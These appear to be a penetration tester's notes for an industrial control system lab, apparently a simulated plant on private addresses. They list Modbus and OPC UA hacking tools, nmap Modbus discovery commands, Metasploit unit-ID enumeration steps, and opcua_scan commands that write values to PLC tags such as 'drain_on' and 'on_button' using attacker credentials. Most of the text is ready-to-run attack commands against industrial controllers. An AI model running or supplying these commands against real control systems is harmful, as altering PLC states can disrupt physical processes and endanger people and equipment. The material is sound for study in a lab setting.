https://www.bordergate.co.uk/modbus-security/#:~:text=Modbus%20Security%20,Starting%20Nmap
https://github.com/favalex/modbus-cli
https://github.com/tallakt/modbus-cli
https://nmap.org/nsedoc/scripts/modbus-discover.html
https://github.com/wavestone-cdt/opcua-scan
https://aravind07.medium.com/introducing-buspwn-the-modbus-hacking-framework-you-didnt-know-you-needed-7b4d0ef53c42
https://github.com/C4l1b4n/ModBusSploit

NMAP
nmap to recon

nmap --script modbus-discover -p 502 {TARGET-IP}

example for this project:

// industrial-process
nmap --script modbus-discover -p 502 10.11.0.20 

// PLC
nmap --script modbus-discover -p 502 10.11.0.3

// Try different hosts with port 502 and 5020

METASPLOIT

msfconsole

use modbus_findunitid

show options

set RHOSTS 10.11.0.20 

set RPORT

BusPwn
// works for changing coils

ModBusSploit
// works for changing coils




OPCUA SCAN
https://github.com/wavestone-cdt/opcua-scan

/opt/.venv/bin/python3 ./opcua_scan.py read_data -t 'opc.tcp://10.11.0.20:4840/OPCUA/SimulationServer' -a Certificate -c plc.crt.pem -pk plc.crt.pem

/opt/.venv/bin/python3 ./opcua_scan.py write_data -t 'opc.tcp://10.11.0.3:4840/OPCUA/SimulationServer' -a Username -u attacker -p attacker -m SignAndEncrypt -po Basic256Sha256 -c plc.crt.der -pk plc.key.der -r 'ns=1;s=drain_on' --data 0

/opt/.venv/bin/python3 ./opcua_scan.py write_data -t 'opc.tcp://10.11.0.3:4840/OPCUA/SimulationServer' -a Username -u attacker -p attacker -m SignAndEncrypt -po Basic256Sha256 -c plc.crt.der -pk plc.key.der -r 'ns=1;s=on_button' --data True

/opt/.venv/bin/python3 ./opcua_scan.py read_data \
  -t 'opc.tcp://10.11.0.20:4840/OPCUA/SimulationServer' \
  -a Certificate \
  -c industrial-process.crt.pem \
  -pk industrial-process.key.pem
